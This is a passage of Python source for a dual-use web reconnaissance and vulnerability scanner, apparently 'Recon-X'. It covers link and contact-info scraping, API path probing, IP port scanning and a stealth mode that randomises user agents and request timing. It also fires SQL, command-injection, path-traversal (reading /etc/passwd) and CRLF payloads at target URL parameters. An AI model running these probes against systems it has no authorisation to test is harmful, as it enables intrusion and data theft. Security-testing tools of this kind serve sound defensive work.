        "github": r'github\.com/[a-zA-Z0-9._-]+',
        "telegram": r't\.me/[a-zA-Z0-9_]+',
        "whatsapp": r'wa\.me/\d+',
        "discord": r'discord\.(?:gg|com/invite)/[a-zA-Z0-9]+',
        "pinterest": r'pinterest\.com/[a-zA-Z0-9_]+',
        "reddit": r'reddit\.com/r/[a-zA-Z0-9_]+',
    }
    for platform, pat in social_patterns.items():
        matches = re.findall(pat, body, re.I)
        if matches:
            social[platform] = list(set(matches))[:5]
    # addresses (simple heuristic: street-like patterns)
    addresses = set()
    for m in re.finditer(r'\d+\s+[A-Z][a-zA-Z\s]+(?:Street|St|Avenue|Ave|Road|Rd|Boulevard|Blvd|Drive|Dr|Lane|Ln|Court|Ct|Way|Place|Pl)\b', body):
        addresses.add(m.group(0).strip()[:100])
    return {"phones": sorted(phones)[:20], "social": social,
            "addresses": sorted(addresses)[:10]}

# ================= HIDDEN FIELDS EXTRACTOR =================
def extract_hidden_fields(resp):
    """Live: extract hidden form fields and their values."""
    if not resp or not resp.get("ok"):
        return []
    body = resp.get("body") or ""
    if not body:
        return []
    hidden = []
    for m in re.finditer(r'<input[^>]*type\s*=\s*["\']hidden["\'][^>]*>', body, re.I):
        tag = m.group(0)
        name_m = re.search(r'name\s*=\s*["\']([^"\']+)["\']', tag, re.I)
        val_m = re.search(r'value\s*=\s*["\']([^"\']*)["\']', tag, re.I)
        hidden.append({"name": name_m.group(1) if name_m else None,
                       "value": val_m.group(1) if val_m else None})
    return hidden

# ================= RESOURCE INVENTORY =================
def extract_resources(resp):
    """Live: inventory all static resources (JS, CSS, images, fonts, etc.)."""
    if not resp or not resp.get("ok"):
        return {"js": [], "css": [], "images": [], "fonts": [], "other": []}
    body = resp.get("body") or ""
    if not body:
        return {"js": [], "css": [], "images": [], "fonts": [], "other": []}
    parsed = urlparse(resp.get("url") or "")
    base = f"{parsed.scheme}://{parsed.netloc}"

    def resolve(u):
        u = u.strip()
        if u.startswith("/"):
            return base + u
        elif u.startswith("http"):
            return u
        elif u.startswith("//"):
            return parsed.scheme + ":" + u
        else:
            return base + "/" + u

    js = set()
    css = set()
    images = set()
    fonts = set()
    other = set()

    for m in re.finditer(r'<script[^>]*src=["\']([^"\']+)["\']', body, re.I):
        js.add(resolve(m.group(1)))
    for m in re.finditer(r'<link[^>]*href=["\']([^"\']+)["\']', body, re.I):
        href = m.group(1)
        low = href.lower()
        if ".css" in low:
            css.add(resolve(href))
        elif any(ext in low for ext in (".woff", ".woff2", ".ttf", ".otf", ".eot")):
            fonts.add(resolve(href))
        elif any(ext in low for ext in (".png", ".jpg", ".jpeg", ".gif", ".svg", ".webp", ".ico")):
            images.add(resolve(href))
        else:
            other.add(resolve(href))
    for m in re.finditer(r'<img[^>]*src=["\']([^"\']+)["\']', body, re.I):
        images.add(resolve(m.group(1)))

    return {"js": sorted(js), "css": sorted(css), "images": sorted(images)[:50],
            "fonts": sorted(fonts), "other": sorted(other)[:20]}

# ================= API ENDPOINT DISCOVERY =================
API_PATHS = [
    "/api", "/api/v1", "/api/v2", "/api/v3", "/rest", "/graphql", "/gql",
    "/swagger.json", "/openapi.json", "/api-docs", "/swagger-ui.html",
    "/swagger-ui/", "/redoc", "/api/swagger", "/api/openapi", "/docs",
    "/api/users", "/api/login", "/api/auth", "/api/token", "/api/health",
    "/api/status", "/api/version", "/api/info", "/api/config", "/api/settings",
    "/v1", "/v2", "/v3", "/api/v1/users", "/api/v1/auth",
]

def discover_api_endpoints(base_url, timeout=6):
    """Live: probe common API paths and report status + content type."""
    parsed = urlparse(base_url)
    root = f"{parsed.scheme}://{parsed.netloc}"
    found = []
    for path in API_PATHS:
        r = http_request(root + path, timeout=timeout)
        if r.get("ok") and r.get("status", 0) not in (0, 404):
            hdrs = r.get("headers") or {}
            ct = hdrs.get("content-type", "")
            found.append({"path": path, "status": r.get("status", 0),
                          "content_type": ct, "size": len(r.get("body") or "")})
    return found

# ================= RUNNERS =================

def run_link_extractor(ctx, url, args):
    p_section("Full Link Extractor", "43")
    ctx["modules_run"].append("link_extractor")
    resp = ctx.get("http_resp")
    if not resp or not ctx.get("http_ok"):
        p_note("Links", "not measured - no HTTP response")
        ctx["links"] = {"internal": [], "external": [], "all": [], "total": 0}
        return
    links = extract_all_links(resp)
    ctx["links"] = links
    p_ok("Total links", links["total"])
    p_ok("Internal", len(links["internal"]))
    p_ok("External", len(links["external"]))
    if links["external"]:
        for u in links["external"][:15]:
            p_note("  ext", shorten(u, 80), C.GR)
        if len(links["external"]) > 15:
            p_note("More", f"{len(links['external']) - 15} additional in JSON report")

def run_media_extractor(ctx, url, args):
    p_section("Media / Video / Audio Extractor", "44")
    ctx["modules_run"].append("media_extractor")
    resp = ctx.get("http_resp")
    if not resp or not ctx.get("http_ok"):
        p_note("Media", "not measured - no HTTP response")
        ctx["media"] = {"videos": [], "audio": [], "images": [], "documents": [], "iframes": []}
        return
    media = extract_media(resp)
    ctx["media"] = media
    if media["videos"]:
        p_ok("Videos", len(media["videos"]))
        for v in media["videos"][:10]:
            p_ok("  video", v)
    if media["audio"]:
        p_ok("Audio", len(media["audio"]))
        for a in media["audio"][:10]:
            p_ok("  audio", a)
    if media["iframes"]:
        p_ok("Iframes (YT/Vimeo/etc)", len(media["iframes"]))
        for i in media["iframes"][:10]:
            p_ok("  iframe", i)
    if media["documents"]:
        p_ok("Documents", len(media["documents"]))
        for d in media["documents"][:10]:
            p_ok("  doc", d)
    p_ok("Images", len(media["images"]))
    if not any([media["videos"], media["audio"], media["iframes"], media["documents"]]):
        p_note("Media", "no videos/audio/documents/iframes found")

def run_metadata(ctx, url, args):
    p_section("Page Metadata Extractor", "45")
    ctx["modules_run"].append("metadata")
    resp = ctx.get("http_resp")
    if not resp or not ctx.get("http_ok"):
        p_note("Metadata", "not measured - no HTTP response")
        ctx["metadata"] = {}
        return
    meta = extract_metadata(resp)
    ctx["metadata"] = meta
    if meta.get("title"):
        p_ok("Title", shorten(meta["title"], 80))
    if meta.get("description"):
        p_ok("Description", shorten(meta["description"], 80))
    if meta.get("og:title"):
        p_ok("OG Title", shorten(meta["og:title"], 80))
    if meta.get("og:description"):
        p_ok("OG Description", shorten(meta["og:description"], 80))
    if meta.get("og:image"):
        p_ok("OG Image", meta["og:image"])
    if meta.get("og:type"):
        p_ok("OG Type", meta["og:type"])
    if meta.get("twitter:card"):
        p_ok("Twitter Card", meta["twitter:card"])
    if meta.get("twitter:title"):
        p_ok("Twitter Title", shorten(meta["twitter:title"], 80))
    if meta.get("canonical"):
        p_ok("Canonical", meta["canonical"])
    if meta.get("robots"):
        p_ok("Robots", meta["robots"])
    if meta.get("favicon"):
        p_ok("Favicon", meta["favicon"])
    if meta.get("manifest"):
        p_ok("Manifest", meta["manifest"])
    if meta.get("author"):
        p_ok("Author", meta["author"])
    if meta.get("keywords"):
        p_ok("Keywords", shorten(meta["keywords"], 80))
    if not meta:
        p_note("Metadata", "no metadata found")

def run_contact_info(ctx, url, args):
    p_section("Contact Information Extractor", "46")
    ctx["modules_run"].append("contact_info")
    resp = ctx.get("http_resp")
    if not resp or not ctx.get("http_ok"):
        p_note("Contact", "not measured - no HTTP response")
        ctx["contact_info"] = {"phones": [], "social": {}, "addresses": []}
        return
    ci = extract_contact_info(resp)
    ctx["contact_info"] = ci
    if ci["phones"]:
        p_ok("Phone numbers", len(ci["phones"]))
        for ph in ci["phones"][:10]:
            p_ok("  phone", ph)
    if ci["social"]:
        p_ok("Social media", len(ci["social"]))
        for platform, links in ci["social"].items():
            for link in links[:3]:
                p_ok(f"  {platform}", link)
    if ci["addresses"]:
        p_ok("Addresses", len(ci["addresses"]))
        for addr in ci["addresses"][:5]:
            p_ok("  address", addr)
    if not ci["phones"] and not ci["social"] and not ci["addresses"]:
        p_note("Contact", "no contact info found")

def run_hidden_fields(ctx, url, args):
    p_section("Hidden Form Fields", "47")
    ctx["modules_run"].append("hidden_fields")
    resp = ctx.get("http_resp")
    if not resp or not ctx.get("http_ok"):
        p_note("Hidden fields", "not measured - no HTTP response")
        ctx["hidden_fields"] = []
        return
    hf = extract_hidden_fields(resp)
    ctx["hidden_fields"] = hf
    if hf:
        p_ok("Hidden fields", len(hf))
        for h in hf[:20]:
            p_ok(f"  {h['name'] or '?'}", shorten(h["value"] or "", 60))
        if len(hf) > 20:
            p_note("More", f"{len(hf) - 20} additional in JSON report")
    else:
        p_ok("Hidden fields", "none found")

def run_resource_inventory(ctx, url, args):
    p_section("Resource Inventory", "48")
    ctx["modules_run"].append("resource_inventory")
    resp = ctx.get("http_resp")
    if not resp or not ctx.get("http_ok"):
        p_note("Resources", "not measured - no HTTP response")
        ctx["resources"] = {"js": [], "css": [], "images": [], "fonts": [], "other": []}
        return
    res = extract_resources(resp)
    ctx["resources"] = res
    p_ok("JavaScript", len(res["js"]))
    p_ok("CSS", len(res["css"]))
    p_ok("Images", len(res["images"]))
    p_ok("Fonts", len(res["fonts"]))
    if res["js"]:
        for js in res["js"][:10]:
            p_note("  js", shorten(js, 80), C.GR)
    if res["css"]:
        for css in res["css"][:10]:
            p_note("  css", shorten(css, 80), C.GR)

def run_api_discovery(ctx, url, args):
    p_section("API Endpoint Discovery", "49")
    ctx["modules_run"].append("api_discovery")
    found = discover_api_endpoints(url, timeout=args.timeout)
    ctx["api_endpoints"] = found
    if found:
        p_ok("API endpoints", len(found))
        for ep in found:
            p_ok(f"  {ep['path']}", f"HTTP {ep['status']}  {ep['content_type']}  ({ep['size']} bytes)")
    else:
        p_ok("API endpoints", "none discovered")

def run_score(ctx):
    p_section("Security Score", "*")
    ctx["modules_run"].append("score")
    sc = compute_score(ctx)
    ctx["score"] = sc
    for chk in sc["checks"]:
        if chk["passed"] is None:
            mark, pts = c("[?]", C.GR), c("not measured", C.GR)
        elif chk["passed"]:
            mark, pts = c("[+]", C.G), c(f"+{chk['weight']}", C.GR)
        else:
            mark, pts = c("[-]", C.R), c(f"-{chk['weight']}", C.GR)
        _emit(f"  {mark} {chk['label']:<38} {pts}  {c(chk['detail'], C.GR)}")
    _emit()
    color = C.G if sc["percent"] >= 85 else (C.Y if sc["percent"] >= 55 else C.R)
    _emit(f"  SCORE: {sc['score']}/{sc['max']}  ({sc['percent']}%)  GRADE {sc['grade']}",
          C.BOLD + color)
    if sc["max"] < sc["possible"]:
        _emit(f"  (only {sc['max']} of {sc['possible']} weight was measurable - "
              "unmeasured checks are not counted)", C.GR)
    _emit()

# ================= REPORT =================
def build_report(ctx):
    return {
        "tool": "Recon-X v4.0",
        "timestamp": datetime.datetime.now().isoformat(timespec="seconds"),
        "target": ctx.get("target"),
        "url": ctx.get("url"),
        "modules_run": ctx.get("modules_run"),
        "dns": ctx.get("dns"),
        "dns_ips": ctx.get("dns_ips"),
        "zone_transfer": ctx.get("zone_transfer"),
        "rdap": ctx.get("rdap"),
        "http": ctx.get("http_meta"),
        "waf": ctx.get("waf"),
        "ssl": ctx.get("ssl"),
        "tls_versions": ctx.get("tls_versions"),
        "tls_ciphers": ctx.get("tls_ciphers"),
        "alpn": ctx.get("alpn"),
        "hsts_preload": ctx.get("hsts_preload"),
        "headers": ctx.get("header_audit"),
        "cookies": ctx.get("cookies"),
        "methods": ctx.get("methods"),
        "redirects": ctx.get("redirects"),
        "tech": ctx.get("tech"),
        "paths": ctx.get("paths"),
        "exposed_paths": ctx.get("exposed_paths"),
        "robots": ctx.get("robots"),
        "sitemap": ctx.get("sitemap"),
        "security_txt": ctx.get("security_txt"),
        "emails": ctx.get("emails"),
        "subdomains": ctx.get("subdomains"),
        "open_ports": ctx.get("open_ports"),
        "banners": ctx.get("banners"),
        "geo": ctx.get("geo"),
        "rate_limit": ctx.get("rate_limit"),
        "open_redirects": ctx.get("open_redirects"),
        "host_header": ctx.get("host_header"),
        "reflected_params": ctx.get("reflected_params"),
        "mixed_content": ctx.get("mixed_content"),
        "forms": ctx.get("forms"),
        "favicon": ctx.get("favicon"),
        "sourcemaps": ctx.get("sourcemaps"),
        "email_security": ctx.get("email_security"),
        "dir_listing": ctx.get("dir_listing"),
        "secrets": ctx.get("secrets"),
        "graphql": ctx.get("graphql"),
        "websocket": ctx.get("websocket"),
        "cache_poison": ctx.get("cache_poison"),
        "hpp": ctx.get("hpp"),
        "dnssec": ctx.get("dnssec"),
        "vuln_inventory": ctx.get("vuln_inventory"),
        "http_smuggling": ctx.get("http_smuggling"),
        "html_report": ctx.get("html_report"),
        "resume_diff": ctx.get("resume_diff"),
        "dns_bruteforce": ctx.get("dns_bruteforce"),
        "js_endpoints": ctx.get("js_endpoints"),
        "cloud_buckets": ctx.get("cloud_buckets"),
        "cors_deep": ctx.get("cors_deep"),
        "sensitive_data": ctx.get("sensitive_data"),
        "http2": ctx.get("http2"),
        "cache_deception": ctx.get("cache_deception"),
        "sqli": ctx.get("sqli"),
        "cmdi": ctx.get("cmdi"),
        "lfi": ctx.get("lfi"),
        "crlf": ctx.get("crlf"),
        "ssrf": ctx.get("ssrf"),
        "xxe": ctx.get("xxe"),
        "jwt": ctx.get("jwt"),
        "host_header_deep": ctx.get("host_header_deep"),
        "cookie_injection": ctx.get("cookie_injection"),
        "session_fixation": ctx.get("session_fixation"),
        "content_type_sniff": ctx.get("content_type_sniff"),
        "cors_deep2": ctx.get("cors_deep2"),
        "cloud_metadata": ctx.get("cloud_metadata"),
        "oauth": ctx.get("oauth"),
        "s3_deep": ctx.get("s3_deep"),
        "tech_versions": ctx.get("tech_versions"),
        "dns_rebinding": ctx.get("dns_rebinding"),
        "proxy_stealth": ctx.get("proxy_stealth"),
        "links": ctx.get("links"),
        "media": ctx.get("media"),
        "metadata": ctx.get("metadata"),
        "contact_info": ctx.get("contact_info"),
        "hidden_fields": ctx.get("hidden_fields"),
        "resources": ctx.get("resources"),
        "api_endpoints": ctx.get("api_endpoints"),
        "score": ctx.get("score"),
    }

# ================= UTILS =================
def normalize_url(u):
    u = u.strip()
    if not u:
        return None
    if not u.startswith(("http://", "https://")):
        u = "https://" + u
    return u

def get_host(url):
    return urlparse(url).hostname

def is_ip(host):
    try:
        ipaddress.ip_address(host)
        return True
    except Exception:
        return False

# ================= MAIN =================
# ================= IP SCANNER (Scanner Number 2) =================
# Given an IP, discover hosted domains, open ports, and accessible URLs.

IP_SCAN_PORTS = [21, 22, 23, 25, 53, 80, 110, 143, 389, 443, 445, 465, 587,
    993, 995, 1433, 1521, 2049, 3000, 3306, 3389, 5432, 5900, 6379, 8000,
    8080, 8443, 8888, 9000, 9200, 27017, 5000, 5601, 8008, 8081, 9090,
    10000, 8088, 4443, 6443, 7001, 8001, 8082, 9443]

def reverse_ip_lookup(ip, timeout=12):
    """Live: find domain names hosted on an IP via PTR + public APIs + TLS certs."""
    domains = set()
    notes = []

    # 1. Reverse DNS (PTR)
    ptrs = reverse_dns(ip)
    for p in ptrs:
        d = p.rstrip(".")
        if d and d != ip:
            domains.add(d)
    if ptrs:
        notes.append(f"PTR: {', '.join(ptrs)}")
    else:
        notes.append("PTR: none")

    # 2. hackertarget.com reverse IP (free, no key)
    try:
        r = http_request(f"https://api.hackertarget.com/reverseiplookup/?q={ip}",
                         timeout=timeout)
        if r.get("ok") and r.get("status") == 200:
            body = r.get("body") or ""
            if "error" not in body.lower() and "no records" not in body.lower():
                for line in body.splitlines():
                    line = line.strip().lower()
                    if line and "." in line and not line.startswith("api."):
                        domains.add(line)
                notes.append("hackertarget.com: ok")
            else:
                notes.append(f"hackertarget.com: {body.strip()[:60]}")
    except Exception as e:
        notes.append(f"hackertarget.com: {clean_error(e)}")

    # 3. viewdns.info (free)
    try:
        r = http_request(f"https://viewdns.info/reverseip/?host={ip}&t=1",
                         timeout=timeout)
        if r.get("ok") and r.get("status") == 200:
            body = r.get("body") or ""
            # extract domain-like strings from table cells
            for m in re.finditer(r">([a-zA-Z0-9][a-zA-Z0-9.\-]+\.[a-zA-Z]{2,})</", body):
                d = m.group(1).lower()
                if d and not d.startswith("viewdns"):
                    domains.add(d)
            notes.append("viewdns.info: ok" if domains else "viewdns.info: no domains")
    except Exception as e:
        notes.append(f"viewdns.info: {clean_error(e)}")

    return sorted(domains), notes

def tls_cert_domains(ip, port, timeout=8):
    """Live: extract CN + SAN from the TLS cert on a port."""
    try:
        import ssl as _s
        ctx = _s.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = _s.CERT_NONE
        with socket.create_connection((ip, port), timeout=timeout) as sock:
            with ctx.wrap_socket(sock, server_hostname=ip) as ss:
                der = ss.getpeercert(binary_form=True)
                dec = _decode_cert(der)
                if not dec:
                    return [], ss.version(), None
                cn = _first_cn(dec.get("subject"))
                sans = [v for k, v in dec.get("subjectAltName", ()) if k == "DNS"]
                names = []
                if cn:
                    names.append(cn)
                names.extend(sans)
                # dedupe
                seen = set()
                out = []
                for n in names:
                    if n and n.lower() not in seen:
                        seen.add(n.lower())
                        out.append(n)
                cipher = ss.cipher()
                return out, ss.version(), (cipher[0] if cipher else None)
    except Exception:
        return [], None, None

def probe_port_service(ip, port, timeout=5):
    """Live: probe a single port and return service info + accessible URL."""
    info = {"port": port, "open": False, "service": SERVICE_MAP.get(port, "unknown"),
            "banner": "", "url": None, "title": None, "server": None,
            "tls": None, "cert_domains": [], "status": None, "redirect": None}
    # TCP connect
    try:
        with socket.create_connection((ip, port), timeout=timeout):
            info["open"] = True
    except Exception:
        return info

    # TLS cert extraction for TLS ports
    tls_ports = {443, 8443, 4443, 9443, 6443, 7001}
    if port in tls_ports:
        domains, ver, cipher = tls_cert_domains(ip, port, timeout=timeout)
        info["tls"] = ver
        info["cert_domains"] = domains
        info["cipher"] = cipher

    # HTTP/HTTPS probe
    scheme = "https" if port in tls_ports else "http"
    url = f"{scheme}://{ip}:{port}/"
    r = http_request(url, timeout=min(timeout + 3, 8), allow_redirects=False)
    info["status"] = r.get("status", 0)
    if r.get("ok") and r.get("status", 0) > 0:
        hdrs = r.get("headers") or {}
        info["server"] = hdrs.get("server")
        info["title"] = None
        body = r.get("body") or ""
        m = re.search(r"<title[^>]*>(.*?)</title>", body, re.I | re.S)
        if m:
            info["title"] = m.group(1).strip()[:80]
        loc = hdrs.get("location")
        if loc:
            info["redirect"] = loc
        info["url"] = url
        # banner grab fallback
        if not info["banner"]:
            info["banner"] = shorten(body, 60) if body else ""
    else:
        # try banner grab for non-HTTP services
        info["banner"] = grab_banner(ip, port, info["service"], timeout=timeout)

    # Build accessible URL with domain if available
    return info

def run_ip_scan(ip, args):
    """Scanner Number 2: IP -> domains + ports + accessible URLs."""
    p_section("Scanner Number 2 - IP to Domains", "IP")
    ctx = {"ip": ip, "modules_run": []}

    # validate IP
    try:
        ipaddress.ip_address(ip)
    except Exception:
        p_bad("IP", f"invalid IP address: {ip}")
        return

    p_ok("Target IP", ip)
    p_ok("Engine", "requests" if HAS_REQ else "urllib fallback")

    # 1. Reverse IP lookup
    p_section("Reverse IP Lookup (domains on this IP)", "1")
    ctx["modules_run"].append("reverse_ip")
    domains, notes = reverse_ip_lookup(ip, timeout=max(12.0, args.timeout))
    ctx["domains"] = domains
    ctx["reverse_notes"] = notes
    for n in notes:
        p_note("Source", n)
    if domains:
        p_ok("Domains found", len(domains))
        for d in domains[:30]:
            p_ok("Domain", d)
        if len(domains) > 30:
            p_note("More", f"{len(domains) - 30} additional domains in JSON report")
    else:
        p_warn("Domains", "none found via reverse lookup")

    # 2. Port scan
    p_section("Port Scan on IP", "2")
    ctx["modules_run"].append("port_scan")
    open_ports = port_scan(ip, timeout=min(2.0, args.timeout), workers=args.threads)
    ctx["open_ports"] = open_ports
    if not open_ports:
        p_note("Ports", "no open ports found")
    else:
        p_ok("Open ports", len(open_ports))
        for port in open_ports:
            svc = SERVICE_MAP.get(port, "unknown")
            risky = RISKY_PORTS.get(port)
            p_ok(f"port {port}", f"{svc}" + (f"  [risky: {risky}]" if risky else ""),
                 C.Y if risky else C.G)

    # 3. Probe each open port for service info + accessible URLs
    p_section("Service Probes & Accessible URLs", "3")
    ctx["modules_run"].append("service_probes")
    probes = []
    with ThreadPoolExecutor(max_workers=max(1, min(args.threads, 12))) as pool:
        futures = {pool.submit(probe_port_service, ip, port, min(6.0, args.timeout)): port
                   for port in open_ports}
        for fut in as_completed(futures):
            port = futures[fut]
            try:
                probes.append(fut.result())
            except Exception as e:
                probes.append({"port": port, "open": True, "error": str(e)})
    probes.sort(key=lambda x: x.get("port", 0))
    ctx["probes"] = probes

    # 4. TLS cert domains from HTTPS ports
    tls_domains = set()
    for pr in probes:
        for d in (pr.get("cert_domains") or []):
            tls_domains.add(d)
    if tls_domains:
        p_section("TLS Certificate Domains", "4")
        ctx["modules_run"].append("tls_cert_domains")
        p_ok("Domains from certs", len(tls_domains))
        for d in sorted(tls_domains):
            p_ok("Cert domain", d)
            domains.add(d) if False else None
        # merge into domains list
        existing = {x.lower() for x in domains}
        for d in tls_domains:
            if d.lower() not in existing:
                domains.append(d)
                existing.add(d.lower())
        ctx["domains"] = sorted(set(domains))

    # 5. Build accessible URL list
    p_section("Accessible URLs", "5")
    ctx["modules_run"].append("accessible_urls")
    urls = []
    for pr in probes:
        port = pr.get("port")
        if not pr.get("open"):
            continue
        tls_ports = {443, 8443, 4443, 9443, 6443, 7001}
        scheme = "https" if port in tls_ports else "http"
        # Use domain from cert if available, else IP
        host_for_url = ip
        cert_doms = pr.get("cert_domains") or []
        if cert_doms:
            host_for_url = cert_doms[0]
        # Also try domains from reverse lookup
        if not cert_doms and domains:
            host_for_url = sorted(domains)[0]
        url = f"{scheme}://{host_for_url}:{port}/"
        urls.append({
            "url": url, "port": port, "status": pr.get("status"),
            "title": pr.get("title"), "server": pr.get("server"),
            "tls": pr.get("tls"), "cert_domains": cert_doms,
            "redirect": pr.get("redirect"),
        })
        # print
        title = pr.get("title") or ""
        server = pr.get("server") or ""
        status = pr.get("status")
        tls_info = f" [{pr.get('tls')}]" if pr.get("tls") else ""
        p_ok(url, f"HTTP {status}{tls_info}" + (f"  title=\"{title}\"" if title else "") +
             (f"  server={server}" if server else "") +
             (f"  -> {pr.get('redirect')}" if pr.get("redirect") else ""))

    ctx["accessible_urls"] = urls

    # 6. Summary
    p_section("IP Scan Summary", "*")
    p_ok("IP", ip)
    p_ok("Domains found", len(domains))
    for d in sorted(domains):
        p_ok("  Domain", d)
    p_ok("Open ports", len(open_ports))
    p_ok("Accessible URLs", len(urls))
    for u in urls[:20]:
        p_ok("  URL", u["url"])
    if len(urls) > 20:
        p_note("More", f"{len(urls) - 20} additional URLs in JSON report")
    if domains:
        p_ok("Primary URL", f"https://{sorted(domains)[0]}:{open_ports[0] if open_ports else 443}/" if open_ports else "n/a")

    # save to ctx for report
    ctx["report"] = {
        "ip": ip,
        "domains": sorted(domains),
        "reverse_notes": notes,
        "open_ports": open_ports,
        "probes": probes,
        "tls_cert_domains": sorted(tls_domains),
        "accessible_urls": urls,
    }
    return ctx

# ================= PROXY / STEALTH / THROTTLE SUPPORT =================
import random as _random

# Global stealth/throttle settings (set by main())
STEALTH_MODE = False
THROTTLE_DELAY = 0.0
PROXY_URL = None

def _apply_proxy():
    """Apply proxy settings to environment for requests library."""
    if PROXY_URL:
        os.environ["HTTP_PROXY"] = PROXY_URL
        os.environ["HTTPS_PROXY"] = PROXY_URL
        os.environ["http_proxy"] = PROXY_URL
        os.environ["https_proxy"] = PROXY_URL

def _stealth_delay():
    """Randomized delay for stealth mode."""
    if STEALTH_MODE:
        delay = _random.uniform(0.5, 2.5)
        time.sleep(delay)
    if THROTTLE_DELAY > 0:
        time.sleep(THROTTLE_DELAY)

def _stealth_ua():
    """Return a randomized User-Agent for stealth mode."""
    if STEALTH_MODE:
        return _random.choice(UA_POOL)
    return None

# Wrap http_request to apply stealth + proxy + throttle
_ORIGINAL_HTTP_REQUEST = None

def _patched_http_request(url, method="GET", timeout=8, allow_redirects=True, headers=None, data=None):
    _stealth_delay()
    h = dict(headers or {})
    if STEALTH_MODE:
        ua = _stealth_ua()
        if ua:
            h["User-Agent"] = ua
    # Apply proxy via env (requests reads env automatically)
    _apply_proxy()
    # Call original
    return _orig_http_request(url, method=method, timeout=timeout,
                              allow_redirects=allow_redirects, headers=h, data=data)

# We'll patch after defining _orig_http_request alias
_orig_http_request = http_request

# ================= SQL INJECTION PROBE =================
SQLI_PAYLOADS = [
    "'",
    "\"",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR 1=1--",
    "1' AND '1'='1",
    "1 AND 1=1",
    "' UNION SELECT NULL--",
    "'; WAITFOR DELAY '0:0:5'--",
    "1; SELECT SLEEP(5)--",
    "' OR SLEEP(5)--",
]

SQLI_ERROR_SIGNATURES = [
    "sql syntax", "mysql", "postgresql", "oracle", "sqlite", "odbc",
    "jdbc", "microsoft sql", "syntax error", "unclosed quotation",
    "quoted string not properly terminated", "ORA-", "PG::", "SQLSTATE",
    "Warning: mysql", "Fatal error", "mysqli", "pdo", "sqlite3",
    "unterminated string", "invalid column", "unknown column",
]

def test_sqli(url, timeout=8):
    """Live: test URL parameters for SQL injection (error-based + time-based)."""
    parsed = urlparse(url)
    params = parsed.query
    if not params:
        # Try common params
        params = "id=1&q=test&search=test&page=1"
    base = f"{parsed.scheme}://{parsed.netloc}{parsed.path or '/'}"
    results = []
    # Parse existing params
    param_list = []
    for p in params.split("&"):
        if "=" in p:
            k, v = p.split("=", 1)
            param_list.append((k, v))
    if not param_list:
        param_list = [("id", "1"), ("q", "test")]
    
    for param_name, original_val in param_list:
        for payload in SQLI_PAYLOADS[:6]:  # limit to avoid too many requests
            test_url = f"{base}?{param_name}={quote(payload, safe='')}"
            t0 = time.time()
            r = http_request(test_url, timeout=timeout)
            elapsed = time.time() - t0
            body = (r.get("body") or "").lower()
            error_found = any(sig in body for sig in SQLI_ERROR_SIGNATURES)
            time_based = elapsed > 4.0  # if sleep payload caused delay
            vulnerable = error_found or (time_based and "sleep" in payload.lower())
            results.append({
                "param": param_name, "payload": payload,
                "status": r.get("status", 0), "error_found": error_found,
                "time_based": time_based, "elapsed": round(elapsed, 2),
                "vulnerable": vulnerable
            })
            if vulnerable:
                break  # stop testing this param after first hit
    return results

# ================= COMMAND INJECTION PROBE =================
CMDI_PAYLOADS = [
    "; ls",
    "| ls",
    "& ls",
    "; id",
    "| id",
    "& id",
    "; whoami",
    "| whoami",
    "$(id)",
    "`id`",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
]

CMDI_SIGNATURES = [
    "root:", "bin/bash", "bin/sh", "uid=", "gid=", "groups=",
    "www-data", "daemon", "nobody", "total ", "drwxr",
]

def test_cmdi(url, timeout=8):
    """Live: test URL parameters for OS command injection."""
    parsed = urlparse(url)
    params = parsed.query
    if not params:
        params = "id=1&q=test&search=test"
    base = f"{parsed.scheme}://{parsed.netloc}{parsed.path or '/'}"
    param_list = []
    for p in params.split("&"):
        if "=" in p:
            k, v = p.split("=", 1)
            param_list.append((k, v))
    if not param_list:
        param_list = [("id", "1"), ("q", "test")]
    
    results = []
    for param_name, original_val in param_list:
        for payload in CMDI_PAYLOADS[:5]:
            test_url = f"{base}?{param_name}={quote(payload, safe='')}"
            r = http_request(test_url, timeout=timeout)
            body = (r.get("body") or "").lower()
            cmd_found = any(sig in body for sig in CMDI_SIGNATURES)
            results.append({
                "param": param_name, "payload": payload,
                "status": r.get("status", 0), "cmd_output_found": cmd_found,
                "vulnerable": cmd_found
            })
            if cmd_found:
                break
    return results

# ================= PATH TRAVERSAL (LFI) PROBE =================
LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "..\\..\\..\\..\\windows\\win.ini",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "php://filter/convert.base64-encode/resource=index.php",
    "file:///etc/passwd",
]

LFI_SIGNATURES = [
    "root:", "bin/bash", "bin/sh", "[extensions]", "[fonts]",
    "[files]", "for 16-bit", "daemon:", "nobody:",
]

def test_lfi(url, timeout=8):
    """Live: test URL parameters for path traversal / LFI."""
    parsed = urlparse(url)
    params = parsed.query
    if not params:
        params = "file=test&page=index&id=1"
    base = f"{parsed.scheme}://{parsed.netloc}{parsed.path or '/'}"
    param_list = []
    for p in params.split("&"):
        if "=" in p:
            k, v = p.split("=", 1)
            param_list.append((k, v))
    if not param_list:
        param_list = [("file", "test"), ("page", "index")]
    
    results = []
    for param_name, original_val in param_list:
        for payload in LFI_PAYLOADS[:5]:
            test_url = f"{base}?{param_name}={quote(payload, safe='')}"
            r = http_request(test_url, timeout=timeout)
            body = (r.get("body") or "").lower()
            lfi_found = any(sig in body for sig in LFI_SIGNATURES)
            results.append({
                "param": param_name, "payload": payload,
                "status": r.get("status", 0), "lfi_found": lfi_found,
                "vulnerable": lfi_found
            })
            if lfi_found:
                break
    return results

# ================= CRLF INJECTION PROBE =================
CRLF_PAYLOADS = [
    "%0d%0aX-Injected: true",
    "%0d%0aSet-Cookie: reconx=injected",
    "\\r\\nX-Injected: true",
    "%0aX-Injected: true",
]

def test_crlf(url, timeout=8):
    """Live: test URL parameters for CRLF injection."""
    parsed = urlparse(url)
    params = parsed.query
    if not params:
        params = "redirect=/&url=/&next=/"
    base = f"{parsed.scheme}://{parsed.netloc}{parsed.path or '/'}"
    param_list = []
    for p in params.split("&"):
        if "=" in p:
            k, v = p.split("=", 1)
            param_list.append((k, v))
    if not param_list:
        param_list = [("redirect", "/"), ("url", "/")]
    
    results = []
    for param_name, original_val in param_list:
        for payload in CRLF_PAYLOADS[:3]:
            test_url = f"{base}?{param_name}=/{payload}"
            r = http_request(test_url, timeout=timeout, allow_redirects=False)
            hdrs = r.get("headers") or {}
            crlf_found = ("x-injected" in hdrs or "reconx=injected" in str(hdrs).lower())
            results.append({
